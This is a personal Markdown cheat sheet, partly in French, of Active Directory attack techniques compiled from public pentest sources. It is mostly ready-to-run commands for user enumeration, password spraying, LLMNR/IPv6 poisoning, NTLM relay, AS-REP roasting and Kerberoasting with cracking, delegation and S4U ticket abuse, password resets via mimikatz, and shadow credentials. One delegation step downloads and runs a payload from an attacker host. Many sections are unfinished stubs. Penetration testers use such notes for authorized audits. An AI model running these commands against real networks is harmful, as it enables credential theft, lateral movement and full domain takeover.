*Sources :  https://beta.hackndo.com/ ; https://notes.qazeer.io/ ; https://www.thehacker.recipes/ ; https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html*   
*A large part of the following notes are taken from the mentionned sources and are simply intended to summarize information to compensate my poor memory.*  
   
# <ins> Enumeration & initial access </ins> 
## DC Enumeration
***Find the Domain Controllers of a domain:***   
`nslookup` then:   
```
set type=all
_ldap._tcp.dc._msdcs.DOMAIN_NAME
```
OR:  
`PS> nltest /dclist:<domain>`   
The DC is often the DNS server except for specific cases, can be found with dig, ifconfig, ipconfig, etc.    

## Obsolete versions  
***Find obsolete servers or workstations:***
```
Get-ADComputer -Credential $Creds -Server 10.1.1.1 -Filter { operatingsystem -like "*Server 2003*" } -Property * | Format-Table Name,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion -Wrap -Auto
```
      
## User Enumeration 
***User enumeration through Kerberos port 88:***  
`./kerbrute_linux_amd64 userenum --dc 10.10.11.152 -d <domain> /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`
  
 ***Browse through Active Directory:***   
 `ADExplorer.exe` with Sysinternals installed (not flagged because it is a Microsoft-signed tool)    
 `C:> rundll32 dsquery,OpenQueryWindow`  

## Find Credentials   
### Passwords in network shares  
`runas /netonly /user:domain.local\john.michael.auditor ".\Snaffler.exe -s -c <DC_IP> -o Snaffler_output.log"`   
`crackmapexec smb 10.9.15.12 -u 'john.michael.auditor' -p <password> -d <domain> --shares`  
<br>  
### Password in users' AD description:  
`crackmapexec smb 10.10.10.10 -u 'john.fromthegarden' -p 'strongpassword' --users`   
<br>  
# <ins> Lateral Movement / Privesc </ins>       
## Password spraying (Use/Re-use credentials)    
Build domain users list with: `crackmapexec smb 10.10.10.10 -u 'john.fromthegarden' -p 'strongpassword' --users`   
Get the password policy with: `crackmapexec smb 10.10.10.10 -u 'john.fromthegarden' -p 'strongpassword' --pass-pol`  
<br>  
Large password spraying (one user = one password, no bruteforce):  
/!\ pay attention to the lockout policy and badpwdcount not to lock accounts /!\    
`crackmapexec smb 10.10.10.10 -u users.txt -p "Password2023" --no-bruteforce --continue-on-succes`
 <br>  
 Targeted password spraying on network ranges:  
`crackmapexec winrm 192.168.110.52-56 -u "Administrator" -p "P@ssw0rd"`   
`crackmapexec smb 192.168.110.52-56 -u 'Administrator' -p 'PASSWORD' --local-auth`   
 <br>
 Reuse found hashes on the network :   
`crackmapexec smb 192.168.110.52-56 -u administrator -H 'LMHASH:NTHASH' --local-auth`  
`crackmapexec smb 192.168.110.0/24 -u administrator -H 'NTHASH'`  
 <br> 
 Use remote Powershell:  
 Add the remote computer to trusted hosts:  
`Set-Item WSMan:\localhost\Client\TrustedHosts -Value *`  
Then:  
```
$user = 'domain.lol\johnfromthegarden'
$pass = 'Habile!123'
$secpasslol = ConvertTo-SecureString $pass -AsPlainText -Force
$creds = New-Object system.management.automation.PSCredential $user,$secpasslol
```
Then:  
`powershell -c "Invoke-Command -Computer webaw.yolo.local -ScriptBlock {powershell.exe -c Start-Process -NoNewWindow -FilePath C:\Temp\bc3.exe}"`  
OR  
`Enter-PSSession -ComputerName 10.10.10.12 -Credential $creds`    
<br>   
  
## NTLM relay & MitM   
### MitM through LLMNR & NBT-NS poisoning 
In some environments (like Windows ones), multicast name resolution protocols are enabled by default, such as LLMNR (Local-Link Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and mDNS (multicast Domain Name System). Those environments can fallback to those protocols when standard domain name resolution protocols fail. Windows systems attempt to resolve names in the following order: DNS, LLMNR and NBT-NS.  
<br>
Using Responder:  
On Linux: `sudo responder --interface "eth0"`   
<br>
Using Inveigh:  
On Windows: `Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP <IP>`  

### MitM through rogue IPv6 DHCP server      
Using mitm6 (explanation from **notes.qazeer.io** : By default, every Windows system (starting from Windows Vista) will request, upon booting and periodically, an IPv6 configuration through the Dynamic Host Configuration Protocol version 6 (DHCPv6) protocol by broadcasting a Solicit request. The mitm6 Python utility will listen on the network for such DHCPv6 requests and reply to the emitting hosts, assigning them an IPv6 address within the link-local range and setting the attacking machine's IP as their default IPv6 DNS server. As no IPv6 gateway is specified by mitm6, the victim hosts will not attempt to use IPv6 for communication with hosts outside the link-local network. The DNS server maliciously configured on a victim host will be preferred to the host's IPv4 DNS server and used to query for both A (IPv4) and AAAA (IPv6) DNS records.).  
Using mitm6: `sudo python3 mitm6.py -d yolo.local -i eth0 --ignore-nofqdn`  

### MitM through coercion:    
With an account on the domain, it is possible to perform a coercion through several RPC calls in the SMB \pipe\spoolss named pipe through the IPC$ share.  
<ins>Using PetitPotam:</ins>        
Exploiting `MS-EFSRPC` with the following commands:     
`TODO`    
<ins>Using Printerbug: </ins>      
Exploiting `MS-RPRN` with the following commands:     
`printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET''ATTACKER HOST'`        
<ins>Using Printnightmare: <ins>      
`TODO`  
  
<br>  

### NTLM relay    
Dump AD infos trhought the DC if the relayed user has the rights:  
`impacket-ntlmrelayx -t "ldap://domaincontroller" [-smb2support] --dump-adcs --dump-laps --dump-gmsa`  
    
Abuses the default value (i.e. 10) of `ms-DS-MachineAccountQuota` to create a domain machine account controled by the attacker:  
`impacket-ntlmrelayx.py -t ldaps://$DC_TARGET--add-computer TESTCOMPUTER`   

<br>  
 
## AS_REP Roasting - Not authenticated      
  
https://beta.hackndo.com/kerberos-asrep-roasting/
  
  
### Outils :  
·       Rubeus
·       Impacket : GetNPUsers.py
  
### Explication :  
Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification préalable ne soit pas demandée pour certains comptes, permettant à un attaquant d’abuser de cette configuration.
Lorsque nous avons parlé du fonctionnement de Kerberos, il a été mis en évidence que dans le premier échange (KRB_AS_REQ - KRB_AS_REP), le client doit d’abord s’authentifier auprès du KDC avant d’obtenir un TGT. Une partie de la réponse du KDC étant chiffrée avec le secret du compte client (la clé de session), il est important que cette information ne soit pas accessible sans authentification. Dans le cas échéant n’importe qui pourrait demander un TGT pour un compte donné, et tenter de décrypter la partie chiffrée de la réponse KRB_AS_REP pour retrouver le mot de passe de l’utilisateur ciblé.
  

TODO IMG


### Remédiation :  
Ne pas activer “Do not require Kerberos preauthentication”
  
  
À partir de l’adresse <https://beta.hackndo.com/kerberos-asrep-roasting/>
  
### Exécution  
***Récupération des TGT pour les utilisateurs pour lesquels la preauth Kerberos est désactivée :***  
<br>
`PS > python C:\GetNPUsers.py spookysec.local/ -no-pass -usersfile .\userlist2.txt -dc-ip <dc_ip> -outputfile .\ASREP_Roastable_users.txt`
  
***Puis cracking :***  
`PS> john --wordlist=$wordlist ASREP_Roastable_users.txt`
  
(ou : `PS >  .\hashcat.exe --force -m 18200 -a 0 -o "../hash_res.txt" "../svc-admin.txt"`)  
  
## Timeroasting - Not authenticated - TODO      
  
https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf  
https://github.com/SecuraBV/Timeroast   
  
  
### Outils :  
·       https://github.com/SecuraBV/Timeroast
  
### Explication :  
TODO

## Kerberoasting - Authenticated  

### Outils :  
- ListusersSPNs.ps1  
- Impacket GetUserSPNs.py  
  
### Explications :  
Les comptes de service ont un SPN (Service Principal Name), exemple : www/WEB-SERVER-01.adsec.local  
SPN = combinaison du service + de la machine hébergeant le service 
Pour un utilisateur authentifié et en possesion d'un TGT, il est possible de demander un TGS pour n'importe quel service auprès du KDC. Ce TGS sera chiffré avec le mot de passe du compte possédant le SPN. Les comptes de service ont généralement un mdp robuste (20-30 caractères), cependant il arrive que certains comptes utilisateur ou comptes de service au mot de passe faible possèdent un SPN, il est donc possible pour un utilisateur authentifié et en possesion d'un TGT de requêter un TGS en indiquant ce SPN et de casser le mot de passe du TGS fourni.    
L'attaque se base également sur le fait qu'une partie des tickets de service est chiffrée en utilisant l'un des secrets du compte de service et que le type de chiffrement à utiliser peut être spécifié côté client afin de forcer l'utilisation de la clé RC4. Ainsi, une attaque de cassage hors ligne sur les tickets de service peut être menée pour récupérer le mot de passe en clair du compte de service correspondant.
    
### Remédiation :  
Pas de SPN sur les comptes utilisateurs (ces derniers ont souvent des comptes à mot de passe suivant la politique AD pouvant être bruteforcés), ou alors si VRAIMENT nécessaire, utiliser la fonctionnalité “Managed Service Accounts” (MSA) de Microsoft qui permet de faire en sorte que le mot de passe du compte soit robuste et changé régulièrement et automatiquement  
  
### Exécution  
`ListusersSPNs.ps1`, listing des utilisateurs possédant un SPN :  

`$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")`  
`$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"`     
`$results = $search.Findall()`    
`foreach($result in $results)`    
 &nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$userEntry = $result.GetDirectoryEntry()`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host "SPNs"`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`foreach($SPN in $userEntry.servicePrincipalName)`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`{`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$SPN`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`}`  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`Write-host ""`  
 &nbsp;&nbsp;&nbsp;`}`      
       
  
À partir de l’adresse <https://beta.hackndo.com/kerberoasting/>
  
  
***Récupération des TGS :***  
<br> 
`C:\Users\Leperche\Desktop\no_scan\impacket-master\examples>python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<domain_username>`  
  
`impacket-GetUserSPNs -target-domain domain.htb -outputfile kerberoastables.txt -dc-ip 192.168.110.50 -request domain.htb/michael`  
  
***Cracking des TGS :***    
  
`
john --format=krb5tgs --wordlist=/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt TGS_to_crack.txt
`
  
***Affichage des TGS crackés :***  
  
`cat ~/.john/john.pot`

## Kerberos delegation    
Kerberos Delegation authorizes an application to access resources hosted on a different server; for example, instead of giving the service account running the web server access to the database directly, we can allow the account to be delegated to the SQL server service. Once a user logs into the website, the web server service account will request access to the SQL server service on behalf of that user, allowing the user to get access to the content in the database that they’ve been provisioned to without having to assign any access to the web server service account itself.

<ins>Unconstrained Delegation:</ins> This is the most permissive option. The account or computer can request access to **any service on any host**.  
<ins>Constrained Delegation:</ins> This is a more secure option. The account or computer can request access to **defined services only**.  
<ins>Resource-based Delegation:</ins> In RBCD, the responsibility is shifted, it’s at the level of the resource that receives the delegated authentications that the information of whether or not the delegation is accepted is found. The resources (or services) have a list of accounts they trust for delegation.  

### Unconstrained delegation  
TODO   
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/Images/93-unconstrained-delegation.png?raw=true)   
*Source: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html*  
    

### Constrained delegation  
Search for the `allowedtodelegate` attribute (Powerview, Sharphound, etc.) then on the account:  
`rubeus tgtdeleg`  
OR  
`rubeus renew /dc:10.9.20.10 /ticket:<old_ticket>`  

Create the ticket:  
`rubeus s4u /ticket:<ticket> /impersonateuser:John.Fromthegarden /dc:dc.yolo.local /domain:yolo.local /nowrap /msdsspn:time/WEBAW.yolo.local /altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm /ptt`  

 Execute commands on the remote host through the new ticket with the 'HTTP' service:  
 `powershell -c "Invoke-Command -Computer webaw.yolo.local -ScriptBlock {powershell.exe iwr -Uri http://10.10.16.20:8080/bc3.exe -OutFile c:\Temp\bc3.exe}"`  
 `powershell -c "Invoke-Command -Computer webaw.yolo.local -ScriptBlock {powershell.exe -c Start-Process -NoNewWindow -FilePath C:\Temp\bc3.exe}"`   
If need to stop the process: `$Proc1 = Start-Process -NoNewWindows C:\Temp\mmktz.exe` Then `Stop-Process $Proc1`   

### Resource-based constrained delegation  
TODO  
  

### S4U2Self / S4U2Proxy (Constrained delegation)     
*Source : https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse*   
S4U2self can be used for Local Privilege Escalation, or for stealthier alternative to Silver Ticket.  Service for User to Self (S4U2self) allows a service to obtain a Service Ticket to itself, on behalf of a user (called "principal"). Last but not least, S4U2self can be used to produce a Service Ticket to oneself on behalf of another domain user, even if that user is "sensitive for delegation" or member of the Protected Users group. Consequently, this allows attackers, in very specific scenarios, to escalate their privileges or perform lateral movements. Since **machine accounts have their own set of SPNs by default at their creation, S4U2self can be used by any machine account, without any supplementary configuration. If an attacker manages to execute code as NT AUTHORITY\NETWORK SERVICE or as any other "Microsoft Virtual Account" (e.g. defaultapppool or mssqlservice) he will be able to escalate his privileges by abusing S4U2self, as these accounts are acting as the machine account in the Active Directory**. This happens because this kind of accounts all act on the network as the machine itself.    
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/Images/92-constrained-delegation.png?raw=true)   
![alt text](https://github.com/Leperchedesu/Notes_Secu/blob/main/Misc_Tips/Images/91-protocol-transition.png?raw=true)   
*Source: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html*  
  
### S4U2self exploitation:  
1 - Get the TGT:   
Windows: `Rubeus.exe tgtdeleg /nowrap`  
Linux: `getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"`    
2 - Get the Service Ticket:   
Windows: `Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"`  
Linux: `export KRB5CCNAME="/path/to/ticket.ccache"
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'`     

### S4U2Proxy (Constrained delegation)   
TODO
   
        
## Silver ticket   
When an attacker gets the password or NT hash of a service account, he can then forge a service ticket and choose the information he wants to put in this ticket in order to access this service, without going through the KDC. This forged ticket is called a Silver Ticket.   
Here is a summary of possible actions and associated services (thanks to https://notes.qazeer.io/active-directory/exploitation-kerberos_silver_tickets):   
- `PsExec` / `SMBExec` / `Crackmapexec SMB`, etc. -> SMB full remote file system access -> `CIFS` service
- LDAP request / DCSync -> LDAP requests, the LDAP service on a DC allows to DCSync -> `LDAP` service
- `WinRM` (`PSSession`) -> PowerShell remoting through Windows Remote Management (WinRM) -> `HTTP`, `HOST` (The HOST service for Windows machines includes a set of machine built-in Windows services, such as the HTTP, SCM and SCHEDULE services, etc.)
- `WMI` (`DCOM`) -> Remote execution of commands through Windows Management Instrumentation (WMI) (Win32_Process class for example) -> `HOST`, `RPCSS` services
- `RSAT` -> Use of the PowerShell cmdlets of the Windows Remote Server Administration Tools (RSAT) suite -> `CIFS`, `LDAP`, `RPCSS` services
-   
  
## Pass the ticket  
TODO  
    
   
## Rights abuse 
### ForceChangePassword abuse
With `Powerview.ps1`:    
```
$SecPassword = ConvertTo-SecureString 'currentuserpassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\currentuser', $SecPassword)


$NewPassword = ConvertTo-SecureString 'password@123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPassword -Credential $Cred
```
```  
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::setntlm /user:TargetUser /password:bahouaismorray /server:10.10.110.75" "exit"
```
### GenericAll abuse  
TODO  
  
    
## Shadow Credentials    
<ins>(Can be exploited in the case of a GenericAll on a user)</ins>    
The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.  
Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.
The ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a special group, etc.) can allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).  
*(From https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)*   
  
### Exploitation   
  
Use `pywhisker` : https://github.com/ShutdownRepo/pyWhisker 
  
List certificates :    
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "list"
```
  
Get info on the listed certificates :   
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
```
  
Add a new certificate and save it to "test1" :  
```
python3 pywhisker.py -d "test.local" -u "johnfromthegarden" -p '!Habile123' --target "SVRMGMT1$" --action "add" --filename test1
```
  
It is also possible to use `Whisker.exe` :  
```
Whisker.exe add /target:WRKST1$
```
  
## GPOs  
## Find dangerous GPOs  
With Group3r (https://github.com/Group3r/Group3r):  
`runas /netonly /user:domain.local\john-michael.auditor ".\Group3r.exe --outfile C:\Users\JMA\Documents\GPOs.txt -d domain.local -c <DC_IP> -u 'domain.local\john-michael.auditor'"`  


      
## DCSync  
TODO
      
## DCShadow  
TODO  
  

## Kerberos in a Linux environment   
TODO `/etc/krb5.keytab`  
TODO `keytabextract.py`   
TODO `export KRB5CCNAME=$path_to_ticket.ccache`  
  
## ADCS  
TODO  `./certipy_linux -dc-ip 10.9.10.10 'yolo.local/John.Garden:P4ssw0rD!@dc.yolo.local' find`   

          
# <ins> Post Exploitation  </ins>  
## Domain/forest trust abuse   
TODO  
  
## Monitoring TGTs  
It is possible to monitor for TGT once on the DC:  
`.\Rubeus.exe monitor /nowrap /interval:2`  
  
Use the `/filteruser:TARGET_DC$` option in order to target specific TGTs    


*Sources :  https://beta.hackndo.com/ ; https://notes.qazeer.io/ ; https://www.thehacker.recipes/ ; https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html*    
*A large part of the above notes are taken from the mentionned sources and are simply intended to summarize information to compensate my poor memory.*  

